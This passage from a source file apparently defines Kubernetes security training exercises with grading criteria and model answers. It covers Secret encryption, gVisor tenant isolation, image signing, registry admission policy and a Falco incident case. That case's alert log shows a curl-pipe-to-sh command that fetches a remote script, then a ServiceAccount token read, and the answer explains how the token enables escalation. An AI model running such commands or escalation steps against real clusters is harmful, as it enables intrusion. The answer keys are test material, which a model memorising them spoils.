              "sudo sed -i 's/^PasswordAuthentication yes/PasswordAuthentication no/; s/^PermitRootLogin yes/PermitRootLogin no/' /etc/ssh/sshd_config\nsudo sshd -t && sudo systemctl reload ssh\nKeep an existing session open while testing a new key-only login so a mistake does not lock you out. Better still: treat nodes as replaceable -- most fleets allow no interactive SSH and debug through kubectl debug node/<name> with audit logging instead."
            ),
            part(
              "Preventing recurrence",
              "Builds nodes from a minimal, purpose-built image (a container-optimized OS or a hardened minimal image baked with the kubelet and runtime), applies CIS node hardening in the image pipeline, and runs kube-bench and a port/service check in CI for the image and periodically on nodes; replaces nodes instead of patching them in place.",
              "Stop hand-fixing nodes. Build a minimal node image (a container-optimized distribution, or a base image with only kubelet, containerd, CNI and the SSH policy above), apply the CIS node profile in the image build, and gate the image on kube-bench --targets node plus an ss/systemctl listing check. Roll nodes by replacement (new image, drain old) so every node is identical and the next 'standard server image' never reaches the cluster."
            ),
          ],
        },
      ],
    },
    // ----------------------------------------------------------------- 20%
    {
      slug: "secrets-encryption-at-rest",
      objective:
        "Manage Kubernetes Secrets securely: encryption at rest with an EncryptionConfiguration, RBAC on secrets, mounting over environment variables, and external secret stores",
      kind: "build",
      title: "Encrypt Secrets at rest and prove it in etcd",
      brief:
        "An audit at the fictional pension administrator Holloway Trust found that Secrets in its kubeadm cluster are stored in etcd as plain base64. The control plane node cp-1 holds etcd and the API server as static pods. You must enable encryption at rest for Secrets, encrypt everything already stored, and leave a path to key rotation, without breaking the API server.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Write the EncryptionConfiguration and the API server changes, the command that re-encrypts existing Secrets, the proof from etcd, and the rotation procedure.",
          parts: [
            part(
              "EncryptionConfiguration",
              "An apiserver.config.k8s.io/v1 EncryptionConfiguration for resources [secrets] whose providers list a real encryption provider first (aescbc or secretbox with a base64 32-byte key, or kms v2) and identity last so existing plaintext can still be read; the key is generated with head -c 32 /dev/urandom | base64 and the file kept root-only on the node.",
              "head -c 32 /dev/urandom | base64   # key material, keep out of Git and chat\napiVersion: apiserver.config.k8s.io/v1\nkind: EncryptionConfiguration\nresources:\n- resources: [secrets]\n  providers:\n  - aescbc:\n      keys:\n      - name: key1\n        secret: <base64 32-byte key>\n  - identity: {}\nSaved as /etc/kubernetes/enc/enc.yaml with mode 0600. The first provider encrypts new writes; every provider in the list can decrypt, so identity last lets the API server still read Secrets written before encryption was on. (The Kubernetes docs no longer recommend aescbc, because CBC mode is open to padding-oracle attacks; they prefer a KMS v2 plugin, or secretbox for a local key. aescbc still works and is shown here because it is the provider most worked examples use.)"
            ),
            part(
              "API server flag and mount",
              "--encryption-provider-config=/etc/kubernetes/enc/enc.yaml on kube-apiserver plus a hostPath volume and volumeMount for /etc/kubernetes/enc (readOnly), then let the kubelet restart the static pod and confirm it comes back.",
              "In /etc/kubernetes/manifests/kube-apiserver.yaml:\n    - --encryption-provider-config=/etc/kubernetes/enc/enc.yaml\n  volumeMounts:\n  - {name: enc, mountPath: /etc/kubernetes/enc, readOnly: true}\nvolumes:\n- name: enc\n  hostPath: {path: /etc/kubernetes/enc, type: DirectoryOrCreate}\nThe kubelet restarts kube-apiserver; watch sudo crictl ps --name kube-apiserver and kubectl get --raw /readyz. A typo in the config file keeps the API server down, so check crictl logs if it does not return."
            ),
            part(
              "Encrypt what is already stored",
              "kubectl get secrets --all-namespaces -o json | kubectl replace -f - rewrites every Secret through the API server so it is stored encrypted; explains a Secret is only re-encrypted when written.",
              "kubectl get secrets --all-namespaces -o json | kubectl replace -f -\nEncryption happens on write, so Secrets created before the change stay plaintext in etcd until rewritten. The replace is a no-op for the content but forces every object through the new provider. Repeat for any other resource type listed in the configuration."
            ),
            part(
              "Proof from etcd",
              "Reads a Secret directly from etcd with etcdctl get /registry/secrets/<ns>/<name> (with the etcd certificates) and shows the value begins with k8s:enc:aescbc:v1:key1 instead of readable base64/plaintext; creates a fresh Secret to check new writes too.",
              "kubectl -n default create secret generic enc-test --from-literal=k=hello\nsudo etcdctl --endpoints=https://127.0.0.1:2379 --cacert=/etc/kubernetes/pki/etcd/ca.crt --cert=/etc/kubernetes/pki/etcd/server.crt --key=/etc/kubernetes/pki/etcd/server.key get /registry/secrets/default/enc-test | hexdump -C | head -3\nThe stored value starts with k8s:enc:aescbc:v1:key1: followed by ciphertext -- no 'hello' and no readable base64. Before the change the same command showed the key and value in clear."
            ),
            part(
              "Rotation",
              "Adds key2 as the second key (key1 still first, so nothing writes with key2 yet) and restarts every API server; then moves key2 to first and restarts again; rewrites all Secrets with kubectl replace so they are re-encrypted with key2; then removes key1 and restarts. Knows why the two-step order matters on a multi-control-plane cluster: every API server must be able to decrypt with key2 before any server writes with it.",
              "1 Generate key2 and add it BELOW key1 in the aescbc keys list (the first key encrypts; every key decrypts), so servers learn key2 without using it. 2 Restart every kube-apiserver with that file. 3 Move key2 to the top, above key1, and restart every API server again -- because all of them could already decrypt key2 data, none ever meets a Secret it cannot read, even mid-roll on an HA control plane. 4 kubectl get secrets -A -o json | kubectl replace -f - to re-encrypt with key2. 5 Remove key1 from the file and restart again. Also back up the configuration file securely: an etcd snapshot is useless without the keys that encrypted it."
            ),
          ],
        },
      ],
    },
    {
      slug: "untrusted-tenant-isolation",
      objective:
        "Understand and implement isolation techniques: multi-tenancy with namespaces, quotas and policies, and sandboxed containers with RuntimeClass (gVisor, Kata Containers)",
      kind: "case",
      title: "Isolate an untrusted tenant's workloads on a shared cluster",
      brief:
        "The fictional data marketplace Elmhurst Exchange lets partner companies run their own processing containers on its shared cluster. A new partner's code is closed-source and the security team classifies it as untrusted. The partner's workloads will live in namespace partner-quill and need to call only Elmhurst's ingest Service in namespace platform on port 8443.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "Current state:\n\n$ kubectl get ns partner-quill --show-labels\nNAME            STATUS   AGE   LABELS\npartner-quill   Active   2d    kubernetes.io/metadata.name=partner-quill\n\n$ kubectl -n partner-quill get resourcequota,limitrange,networkpolicy\nNo resources found in partner-quill namespace.\n\n$ kubectl get runtimeclass\nNo resources found\n\n$ ssh worker-5 'sudo grep -A3 \"plugins.\\\"io.containerd.cri.v1.runtime\\\".containerd.runtimes\" /etc/containerd/config.toml | head -5; which runsc'\n        [plugins.\"io.containerd.cri.v1.runtime\".containerd.runtimes.runc]\n          runtime_type = \"io.containerd.runc.v2\"\n/usr/local/bin/runsc",
          ask: "Explain why namespaces alone do not isolate an untrusted tenant, and write the set of namespace-level controls you would apply first.",
          parts: [
            part(
              "The limit of a namespace",
              "Explains a namespace is a naming and policy scope, not a security boundary: Pods in it share the node kernel with every other tenant's Pods and, by default, can reach every Pod and Service in the cluster and consume unlimited resources.",
              "A namespace only scopes names and lets you attach RBAC, quotas and policies. By itself it changes nothing about the kernel the containers share, the network they can reach (flat, cluster-wide by default) or the CPU and memory they can take. An untrusted container in a bare namespace is one kernel bug away from the node and one curl away from every internal Service."
            ),
            part(
              "Admission and resource controls",
              "Pod Security Admission labels on the namespace (enforce=restricted so no privileged/host namespace/hostPath Pods), a ResourceQuota (CPU, memory, pods) and a LimitRange with defaults and maximums so a tenant Pod cannot omit limits or exhaust the node.",
              "kubectl label ns partner-quill pod-security.kubernetes.io/enforce=restricted pod-security.kubernetes.io/enforce-version=latest\nResourceQuota: requests.cpu 8, requests.memory 16Gi, limits.cpu 16, limits.memory 32Gi, pods 40.\nLimitRange: per-container default request 100m/128Mi, default limit 500m/512Mi, max 2 CPU/4Gi.\nrestricted forbids the escape primitives (privileged, hostPath, host namespaces, added capabilities) at the API; the quota caps the tenant's total so it cannot starve others; the LimitRange guarantees every container carries limits."
            ),
            part(
              "Network isolation",
              "Default-deny ingress and egress in partner-quill, plus an egress allow to DNS and to Pods in namespace platform labeled for the ingest Service on 8443; optionally an ingress policy on the ingest Pods accepting only partner-quill.",
              "NetworkPolicy default-deny: podSelector {}, policyTypes [Ingress, Egress]. NetworkPolicy allow-egress: egress to namespaceSelector kubernetes.io/metadata.name=platform + podSelector app=ingest on TCP 8443, and to kube-dns in kube-system on 53 UDP/TCP. The tenant can now reach exactly one Service. On the platform side, an ingress policy on app=ingest allowing from namespaceSelector kubernetes.io/metadata.name=partner-quill closes the other direction's gaps."
            ),
          ],
        },
        {
          text: "With those in place, the security team still objects: 'restricted stops the obvious escapes, but their code shares our kernel. One container-runtime or kernel CVE and they are on the node with our other tenants.' gVisor's runsc is already installed on the worker nodes, but containerd does not know about it and there is no RuntimeClass.",
          ask: "Add the sandboxed runtime end to end -- containerd, RuntimeClass, the tenant's Pods -- and say how you verify a Pod is really running under gVisor and what the trade-offs are.",
          parts: [
            part(
              "containerd runtime handler",
              "Adds a runsc handler to containerd's config (plugins.\"io.containerd.cri.v1.runtime\".containerd.runtimes.runsc with runtime_type io.containerd.runsc.v1) on every node that will run sandboxed Pods and restarts containerd; the containerd-shim-runsc-v1 binary must be installed alongside runsc.",
              "In /etc/containerd/config.toml on each worker:\n        [plugins.\"io.containerd.cri.v1.runtime\".containerd.runtimes.runsc]\n          runtime_type = \"io.containerd.runsc.v1\"\nsudo systemctl restart containerd (running Pods keep running; the shim is per-container). The shim binary containerd-shim-runsc-v1 must be on PATH next to runsc. The handler name 'runsc' is what the RuntimeClass will reference."
            ),
            part(
              "RuntimeClass and Pods",
              "A RuntimeClass (node.k8s.io/v1) named gvisor with handler runsc (optionally scheduling.nodeSelector to nodes that have it), and runtimeClassName: gvisor in the tenant's Pod specs -- enforced, for example, by a validating admission policy or by a mutating policy engine so the tenant cannot omit it.",
              "apiVersion: node.k8s.io/v1\nkind: RuntimeClass\nmetadata: {name: gvisor}\nhandler: runsc\nscheduling:\n  nodeSelector: {sandbox: gvisor}\nIn each tenant Pod: spec.runtimeClassName: gvisor. Because the tenant writes their own manifests, enforce it rather than trust it: a ValidatingAdmissionPolicy scoped to partner-quill with expression object.spec.runtimeClassName == 'gvisor', or a Kyverno mutate rule that sets it. Label the nodes carrying runsc with sandbox=gvisor so the nodeSelector routes sandboxed Pods to them."
            ),
            part(
              "Verifying the sandbox",
              "From inside a tenant Pod, dmesg or uname shows gVisor's kernel identity (dmesg prints gVisor boot messages; the kernel version reported is gVisor's, not the host's), and on the node crictl inspect / ps shows runsc processes for the container; a Pod that lands without the handler would show the host kernel.",
              "kubectl -n partner-quill exec <pod> -- dmesg | head -3 prints gVisor's distinctive boot lines (e.g. 'Starting gVisor...'), and uname -r reports gVisor's emulated kernel version rather than the node's real kernel. On the node: ps aux | grep runsc shows the sandbox processes, and sudo crictl inspect <container> | grep runtimeType shows io.containerd.runsc.v1. If exec shows the host kernel version, the Pod is not sandboxed -- check runtimeClassName and the node's containerd config."
            ),
            part(
              "Trade-offs",
              "Explains gVisor intercepts syscalls in a user-space kernel, so the container never talks to the host kernel directly (a kernel CVE in the host is not reachable), at the cost of syscall-heavy performance, some unsupported syscalls/features (certain network and filesystem behaviors, no privileged devices) and a per-node dependency; Kata Containers (lightweight VMs) is the alternative with stronger isolation and higher overhead.",
              "gVisor runs the container's syscalls against its own user-space kernel (the Sentry) and lets only a small, hardened set reach the host, so a Linux kernel bug the tenant's code triggers does not escape. Costs: I/O and syscall-heavy workloads run slower, a few syscalls and kernel features are unimplemented (check the app in staging), and every node needs runsc and the shim. Kata Containers wraps each Pod in a lightweight VM for a hardware boundary at more memory and start-up cost. Either way the tenant stays under restricted PSS, quotas and NetworkPolicy -- the sandbox adds a layer, it does not replace them."
            ),
          ],
        },
      ],
    },
    // ----------------------------------------------------------------- 20%
    {
      slug: "minimal-image-sbom-sign",
      objective:
        "Minimize the base image footprint with multi-stage builds, distroless or minimal bases, pinned digests and no shells or package managers in the runtime image",
      kind: "build",
      title: "Rebuild a bloated image, attach an SBOM and sign it",
      brief:
        "The fictional ticketing API team at Whitlock Events ships a Go service from this Dockerfile: FROM golang:1.23 / WORKDIR /src / COPY . . / RUN go build -o /api ./cmd/api / EXPOSE 8080 / CMD [\"/api\"]. The image is 1.1 GB, runs as root, and includes the Go toolchain, a shell, apt and git. A scan reports 212 vulnerabilities, almost all in packages the service never uses. The platform team now requires every production image to be minimal, non-root, carry an SBOM and be signed, with the signature verified at admission.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Write the improved Dockerfile and the commands that scan it, produce the SBOM, sign the image and verify the signature, and explain what each step removes or proves.",
          parts: [
            part(
              "Multi-stage Dockerfile on a minimal base",
              "A build stage FROM golang (pinned, ideally by digest) producing a static binary (CGO_ENABLED=0), and a runtime stage FROM a distroless or scratch-like base (e.g. gcr.io/distroless/static-debian12:nonroot, pinned by digest) that copies only the binary, runs as a non-root user and has no shell or package manager.",
              "FROM golang:1.23@sha256:<digest> AS build\nWORKDIR /src\nCOPY go.mod go.sum ./\nRUN go mod download\nCOPY . .\nRUN CGO_ENABLED=0 GOOS=linux go build -trimpath -ldflags='-s -w' -o /api ./cmd/api\n\nFROM gcr.io/distroless/static-debian12:nonroot@sha256:<digest>\nCOPY --from=build /api /api\nUSER nonroot:nonroot\nEXPOSE 8080\nENTRYPOINT [\"/api\"]\nThe runtime image holds the binary, CA certificates and a passwd entry -- no shell, no apt, no git, no toolchain -- so there is nothing for an attacker to run and almost nothing to be vulnerable. Pinning both bases by digest makes the build reproducible and immune to a tag being repointed. A static binary means the scratch/static base needs no libc."
            ),
            part(
              "Scan",
              "Scans the built image with Trivy (or Grype) and compares to the old count; fails the pipeline on HIGH/CRITICAL with fixes available; explains the drop comes from removing packages, not from ignoring findings.",
              "docker build -t registry.whitlock.example/api:3.2.0 .\ntrivy image --severity HIGH,CRITICAL --exit-code 1 --ignore-unfixed registry.whitlock.example/api:3.2.0\nExpect a handful of findings at most, since the only OS content is distroless's minimal set. --exit-code 1 makes CI fail on actionable HIGH/CRITICAL issues. The 212 went away because the toolchain, shell and package manager -- where they lived -- are no longer in the image."
            ),
            part(
              "SBOM",
              "Generates a Software Bill of Materials with syft (or trivy image --format cyclonedx/spdx-json) and attaches it to the image with cosign attest (or stores it alongside), so consumers can answer 'does this image contain package X version Y' without rescanning.",
              "syft registry.whitlock.example/api:3.2.0 -o spdx-json > api-3.2.0.sbom.spdx.json\ncosign attest --predicate api-3.2.0.sbom.spdx.json --type spdxjson registry.whitlock.example/api:3.2.0\nThe SBOM lists every component (Go modules and the distroless packages) with versions, so when the next library CVE drops the team greps the SBOM instead of rebuilding and rescanning everything. Attesting it with cosign binds it to the image digest so it cannot be swapped."
            ),
            part(
              "Sign and verify",
              "cosign sign on the image digest (keyless with an OIDC identity in CI, or with a key pair cosign generate-key-pair), and cosign verify with the matching key or certificate identity/issuer; pushes by digest, not tag.",
              "cosign sign --key cosign.key registry.whitlock.example/api@sha256:<digest>      # or keyless in CI: cosign sign registry.../api@sha256:<digest>\ncosign verify --key cosign.pub registry.whitlock.example/api@sha256:<digest>   # or --certificate-identity ... --certificate-oidc-issuer ...\nSigning the digest (not the tag) means the signature covers exactly these bytes; verification fails if the image is altered or a different image is pushed under the same tag. Keyless signing ties the signature to the CI job's identity via Fulcio and records it in the Rekor transparency log."
            ),
            part(
              "Verification at admission",
              "A policy controller (Kyverno verifyImages, Sigstore policy-controller, or OPA Gatekeeper with the cosign provider) that rejects Pods whose images are not signed by the team's key or identity, scoped to the production namespaces; notes plain ValidatingAdmissionPolicy cannot verify signatures (no network calls) but can require digests.",
              "Install a policy engine that understands Sigstore -- e.g. a Kyverno ClusterPolicy with verifyImages for registry.whitlock.example/* requiring the team's public key (or keyless subject/issuer), in Enforce mode for production namespaces. Unsigned or tampered images are rejected at Pod creation. CEL-based ValidatingAdmissionPolicy cannot fetch signatures, but a companion policy can require every image reference to include @sha256: so tags cannot be repointed after signing."
            ),
          ],
        },
      ],
    },
    {
      slug: "registry-policy-static-analysis",
      objective:
        "Secure your supply chain: permit only approved registries with admission control (ValidatingAdmissionPolicy or ImagePolicyWebhook), and sign and verify images with cosign",
      kind: "case",
      title: "Block an unapproved image and fix what the linters found",
      brief:
        "At the fictional logistics software house Garrison Freight, policy says production namespaces may run images only from registry.garrison.example. A new Deployment was applied from a public image and the on-call wants it stopped at the door next time, not found by a scan afterwards.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "$ kubectl -n dispatch get deploy routing -o jsonpath='{.spec.template.spec.containers[*].image}'\ndocker.io/library/nginx:latest registry.garrison.example/routing:4.1\n\n$ kubectl get validatingadmissionpolicies\nNo resources found",
          ask: "Write a ValidatingAdmissionPolicy and binding that rejects Pods in namespaces labeled env=production whose containers (init containers included) come from anywhere but registry.garrison.example, explain why this is better than an ImagePolicyWebhook for this need, and say what happens to the already-running Pods.",
          parts: [
            part(
              "ValidatingAdmissionPolicy",
              "An admissionregistration.k8s.io/v1 ValidatingAdmissionPolicy matching CREATE/UPDATE of pods with a CEL validation over object.spec.containers and object.spec.initContainers (and ephemeralContainers) requiring each image to start with registry.garrison.example/, with a message; failurePolicy Fail.",
              "apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingAdmissionPolicy\nmetadata: {name: approved-registry}\nspec:\n  failurePolicy: Fail\n  matchConstraints:\n    resourceRules:\n    - apiGroups: [\"\"]\n      apiVersions: [\"v1\"]\n      operations: [\"CREATE\",\"UPDATE\"]\n      resources: [\"pods\"]\n  validations:\n  - expression: >-\n      object.spec.containers.all(c, c.image.startsWith('registry.garrison.example/')) &&\n      (!has(object.spec.initContainers) || object.spec.initContainers.all(c, c.image.startsWith('registry.garrison.example/')))\n    message: \"images must come from registry.garrison.example\"\nMatching on Pods (not Deployments) catches every path a container can arrive by -- Deployments, Jobs, bare Pods, CronJobs. Including initContainers closes the obvious loophole."
            ),
            part(
              "Binding scoped to production",
              "A ValidatingAdmissionPolicyBinding referencing the policy with validationActions [Deny] and a namespaceSelector matching env=production; optionally a second binding with [Warn, Audit] for other namespaces.",
              "apiVersion: admissionregistration.k8s.io/v1\nkind: ValidatingAdmissionPolicyBinding\nmetadata: {name: approved-registry-prod}\nspec:\n  policyName: approved-registry\n  validationActions: [Deny]\n  matchResources:\n    namespaceSelector:\n      matchLabels: {env: production}\nThe binding is where scope lives: Deny in production, and a second binding with validationActions [Warn, Audit] for dev namespaces gives developers the warning without blocking them. kubectl label ns dispatch env=production if it is not labelled yet."
            ),
            part(
              "Why not ImagePolicyWebhook, and the running Pods",
              "Explains ValidatingAdmissionPolicy is built into the API server, declarative, needs no external service and fails closed without an availability dependency, whereas ImagePolicyWebhook needs an admission plugin enabled on the API server plus an external backend to run and keep available; and notes admission only affects new or updated Pods, so the existing routing Pods keep running until the Deployment is fixed and rolled.",
              "ImagePolicyWebhook requires enabling the plugin in --enable-admission-plugins, an --admission-control-config-file, and a webhook service you must build, host and keep up (and decide what happens when it is down). ValidatingAdmissionPolicy is in-process CEL: no network hop, no service to operate, policy as plain YAML, and Fail means nothing slips through during an outage. Admission is evaluated at write time only: the nginx Pod already running is untouched until someone changes the Deployment -- so fix it now: kubectl -n dispatch set image deploy/routing nginx=registry.garrison.example/nginx:1.27 (or remove the container), and the next rollout is checked by the policy. Test it: kubectl -n dispatch run t --image=docker.io/library/busybox -> denied with the message."
            ),
          ],
        },
        {
          text: "With the registry locked, the team runs static analysis on the routing Deployment before the rollout:\n\n$ kubesec scan routing.yaml | jq '.[0].scoring.critical[], .[0].scoring.advise[] | .selector + \" -- \" + .reason' -r\ncontainers[] .securityContext .privileged == true -- Privileged containers can allow almost completely unrestricted host access\ncontainers[] .securityContext .runAsNonRoot == true -- Force the running image to run as a non-root user to ensure least privilege\ncontainers[] .securityContext .readOnlyRootFilesystem == true -- An immutable root filesystem can prevent malicious binaries being added to PATH\ncontainers[] .securityContext .capabilities .drop | index(\"ALL\") -- Drop all capabilities and add only those required\n\n$ kube-linter lint routing.yaml 2>&1 | grep -E '^\\(object' | sed 's/(object: default\\/routing apps\\/v1, Kind=Deployment) //'\ncontainer \"routing\" does not have a read-only root file system (check: no-read-only-root-fs)\ncontainer \"routing\" has memory limit 0 (check: unset-memory-requirements)\ncontainer \"routing\" is privileged (check: privileged-container)\nobject has 1 replica (check: minimum-replica-count)",
          ask: "Turn the findings into the fixed Deployment fragments, and say which findings you would challenge or accept.",
          parts: [
            part(
              "Security fixes",
              "Removes privileged: true, sets runAsNonRoot: true (with a runAsUser if the image needs it), readOnlyRootFilesystem: true with emptyDir mounts for writable paths, allowPrivilegeEscalation: false and capabilities.drop [ALL], plus seccompProfile RuntimeDefault.",
              "containers:\n- name: routing\n  image: registry.garrison.example/routing:4.1\n  securityContext:\n    privileged: false\n    runAsNonRoot: true\n    runAsUser: 10001\n    allowPrivilegeEscalation: false\n    readOnlyRootFilesystem: true\n    capabilities:\n      drop: [\"ALL\"]\n    seccompProfile:\n      type: RuntimeDefault\n  volumeMounts:\n  - {name: tmp, mountPath: /tmp}\nvolumes:\n- name: tmp\n  emptyDir: {}\nprivileged is the one finding that is never acceptable in a web service: it is root on the node. The rest together satisfy the restricted Pod Security Standard, so the same manifest passes PSA if the namespace is labeled."
            ),
            part(
              "Resources and replicas",
              "Adds resources requests and limits (memory limit especially, so a leak is contained) and raises replicas to at least 2 with a PodDisruptionBudget for availability; explains the linters flag these because a single unbounded Pod is both a stability and a denial-of-service risk.",
              "resources:\n  requests: {cpu: 200m, memory: 256Mi}\n  limits: {memory: 512Mi}\nreplicas: 2 (plus a PodDisruptionBudget minAvailable: 1). A missing memory limit lets one compromised or leaking container take the node down with it -- a security finding as much as an operational one. Two replicas across nodes (add a topologySpreadConstraint) keep the service up through a node drain or a single Pod compromise being killed."
            ),
            part(
              "What to challenge",
              "Accepts every security finding; challenges only where a tool's default does not fit (e.g. minimum-replica-count for a genuinely singleton batch worker, or readOnlyRootFilesystem for an image that truly must write to its root, which is better fixed in the image); documents any exception as an explicit annotation/ignore with a reason rather than silently skipping the check.",
              "Nothing here deserves an exception: routing is a stateless network service and every finding is fixable in the manifest or by adding an emptyDir. Where a finding genuinely does not apply -- a singleton CronJob flagged for replicas, or a third-party image that writes to /app at start -- record the exception in the manifest (kube-linter's ignore-check annotation) with the reason and an owner, so the next reviewer sees a decision, not an omission. Prefer fixing the image over disabling the check."
            ),
          ],
        },
      ],
    },
    // ----------------------------------------------------------------- 20%
    {
      slug: "falco-incident-investigation",
      objective:
        "Investigate and identify phases of an attack and bad actors within the environment: initial access, execution, persistence, privilege escalation, lateral movement and exfiltration in Kubernetes terms",
      kind: "case",
      title: "Work a Falco alert back to the attack and forward to containment",
      brief:
        "Falco runs as a DaemonSet on the fictional recruitment platform Ashford Talent's production cluster, forwarding alerts to the on-call channel; besides the default rules, the team runs its own rule that flags any shell started by a web server process. At 02:14 three alerts arrive within a minute for a Pod in namespace web. You are on call.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "02:14:03.118 Notice Shell spawned by a web server process (user=root user_loginuid=-1 k8s.ns=web k8s.pod=cv-upload-6b7d9c8f5-x2k4m container=4f1e9a2b7c3d shell=sh parent=node cmdline=sh -c \"curl -s http://203.0.113.77/r.sh | sh\" terminal=0)\n02:14:04.402 Warning Outbound connection to a suspicious IP (command=curl -s http://203.0.113.77/r.sh connection=10.244.3.17:51822->203.0.113.77:80 k8s.ns=web k8s.pod=cv-upload-6b7d9c8f5-x2k4m)\n02:14:09.771 Error Read sensitive file untrusted (user=root command=cat /var/run/secrets/kubernetes.io/serviceaccount/token file=/var/run/secrets/kubernetes.io/serviceaccount/token k8s.ns=web k8s.pod=cv-upload-6b7d9c8f5-x2k4m)\n\n$ kubectl -n web get pod cv-upload-6b7d9c8f5-x2k4m -o jsonpath='{.spec.serviceAccountName} {.spec.containers[0].securityContext}'\ncv-upload {}\n\n$ kubectl auth can-i --list --as=system:serviceaccount:web:cv-upload | grep -vE 'selfsubject' | head -4\nResources   Non-Resource URLs   Resource Names   Verbs\nsecrets     []                  []               [get list]\npods        []                  []               [get list create]",
          ask: "Reconstruct what happened in attack-phase terms from the three alerts and the two kubectl results, and say what the attacker can do next if you do nothing.",
          parts: [
            part(
              "Phases from the evidence",
              "Maps the evidence: initial access through the Node.js upload service (the shell's parent is node), execution of a remote script via curl | sh (and outbound connection to an external IP), then credential access -- reading the Pod's ServiceAccount token -- as a step toward privilege escalation and lateral movement inside the cluster.",
              "Initial access: the cv-upload web process (parent=node) spawned a shell with no terminal (terminal=0, so not someone's kubectl exec -it) -- something in the upload handling let an attacker run commands, a classic web exploit. Execution: it fetched and ran a script from 203.0.113.77 (the outbound alert) -- the attacker's staging host. Credential access: the script read the mounted ServiceAccount token. The container runs as root with an empty securityContext, which made every step easier. Nothing yet shows exfiltration of user data, but the token is now in the attacker's hands."
            ),
            part(
              "What the token buys them",
              "Reads the RBAC output: the cv-upload ServiceAccount can get and list Secrets and create Pods in web, so the attacker can read every Secret in the namespace (database credentials, API keys) and create a Pod -- for instance a privileged Pod or one mounting the node's filesystem if admission allows -- to escalate to the node and move laterally; this is why the next minutes matter.",
              "With that token the attacker can call the API as system:serviceaccount:web:cv-upload: kubectl get secrets -n web hands over every credential the namespace holds, and create pods lets them schedule a Pod of their choosing -- a privileged or hostPath Pod if no Pod Security Admission blocks it -- gaining the node, its kubelet credentials and every other tenant's Pods on it. Lateral movement and full exfiltration are a few commands away."
            ),
          ],
        },
        {
          text: "You have authority to act. Current state:\n\n$ kubectl -n web get pods -l app=cv-upload -o wide\nNAME                        READY   STATUS    RESTARTS   AGE   IP            NODE\ncv-upload-6b7d9c8f5-x2k4m   1/1     Running   0          6d    10.244.3.17   worker-3\ncv-upload-6b7d9c8f5-p9r2t   1/1     Running   0          6d    10.244.1.44   worker-1\n\n$ kubectl -n web get pods --field-selector=status.phase=Running --sort-by=.metadata.creationTimestamp | tail -2\ncv-upload-6b7d9c8f5-p9r2t   1/1     Running   0          6d\ndebug-7xq                   1/1     Running   0          3m",
          ask: "Contain and preserve evidence in the right order, then list the hardening that would have stopped or caught each phase earlier.",
          parts: [
            part(
              "Containment order",
              "Revokes the stolen credential first (delete and recreate the ServiceAccount's token exposure: rotate by deleting the Pod after capture, remove the SA's RBAC bindings), isolates the compromised Pod with a NetworkPolicy (deny all ingress/egress for its label) rather than deleting it immediately, deletes the attacker-created Pod debug-7xq after recording its spec, cordons worker-3 if node compromise is suspected, and rotates every Secret the SA could read.",
              "1 Cut the attacker's power: kubectl -n web delete rolebinding <cv-upload binding> (or patch the Role to nothing) so the stolen token can no longer list Secrets or create Pods; projected tokens are bound to the Pod, so deleting the Pod later invalidates it too. 2 Isolate, don't yet delete: apply a NetworkPolicy selecting pod=cv-upload-6b7d9c8f5-x2k4m (label it first) with policyTypes Ingress+Egress and no rules, so it cannot phone home or reach other Pods but its memory and filesystem survive for evidence. 3 kubectl -n web get pod debug-7xq -o yaml > evidence/debug-7xq.yaml, then delete it -- it is the attacker's Pod. 4 kubectl cordon worker-3 and treat the node as suspect if debug-7xq was privileged or used hostPath. 5 Rotate every Secret in web (database passwords, API keys) and audit the other replica p9r2t for the same shell activity."
            ),
            part(
              "Evidence",
              "Captures before destroying: kubectl logs (and --previous), kubectl describe, the Falco events, the audit log entries for the ServiceAccount (what the token was used for), crictl inspect and a filesystem snapshot of the container on worker-3 (crictl exec read-only or a checkpoint), and the attacker script if still present; records times and who did what.",
              "kubectl -n web logs cv-upload-6b7d9c8f5-x2k4m --all-containers > evidence/pod.log; kubectl -n web describe pod ... > evidence/describe.txt; export the Falco alerts; grep the API audit log for \"system:serviceaccount:web:cv-upload\" between 02:14 and now to see exactly which Secrets were read and whether the Pod create came from that token. On worker-3: sudo crictl inspect 4f1e9a2b7c3d > evidence/inspect.json and copy the container's writable layer (or crictl exec -- cat /tmp/r.sh) before the Pod is deleted. Write down the timeline as you go."
            ),
            part(
              "Hardening per phase",
              "Initial access/execution: restricted Pod Security Standard (non-root, read-only root filesystem so r.sh cannot be written, no shell in a distroless image), egress NetworkPolicy blocking arbitrary internet so curl to 203.0.113.77 fails; credential access: automountServiceAccountToken false for a web Pod that does not need the API, and least-privilege RBAC (no secrets list, no pod create); detection: Falco rules already fired -- route them to paging and add a rule for ServiceAccount token reads by non-expected processes; audit logging at RequestResponse for secrets.",
              "Execution: readOnlyRootFilesystem and a distroless image leave the attacker no sh and nowhere to write r.sh; runAsNonRoot removes root; a default-deny egress policy (allow only the upload service's real dependencies) makes curl to 203.0.113.77 time out. Credential access: the upload service never calls the API, so automountServiceAccountToken: false means there is no token to read; and its RBAC should never have included secrets or pod creation. Lateral movement: Pod Security Admission restricted in web blocks the privileged/hostPath Pod the attacker would create. Detection: Falco did its job in seconds -- make these alerts page, not just post; add audit Policy at RequestResponse for secrets so the exact reads are logged; alert on any ServiceAccount token used from an IP other than its Pod's."
            ),
          ],
        },
      ],
    },
    {
      slug: "audit-policy-and-query",
      objective: "Use Kubernetes audit logs to monitor access: write an audit Policy with levels per resource and verb, enable it on the API server, and query the log for who did what",
      kind: "build",
      title: "Write an audit policy that answers 'who touched the Secrets'",
      brief:
        "The fictional pharmaceutical distributor Carrow Health must be able to answer, for any day in the last 90 days: who read or changed any Secret, who changed RBAC, and who exec'd into a Pod -- without logging so much that the control plane disk fills. Health checks and watch traffic should not be logged, and request bodies should be kept only where they matter. The cluster is kubeadm with a single control plane node.",
      safetyNote: GENERAL_SAFETY,
      steps: [
        {
          text: "",
          ask: "Write the audit Policy, the API server configuration that enables it with retention, and the jq queries that answer the three questions.",
          parts: [
            part(
              "Policy structure and noise rules",
              "An audit.k8s.io/v1 Policy whose first rules drop noise: level None for the system:kube-proxy / node watch traffic and for non-resource URLs /healthz*, /readyz*, /livez*, /metrics, and None for watch verbs generally; explains rules are evaluated top-down and the first match wins, so exclusions come first.",
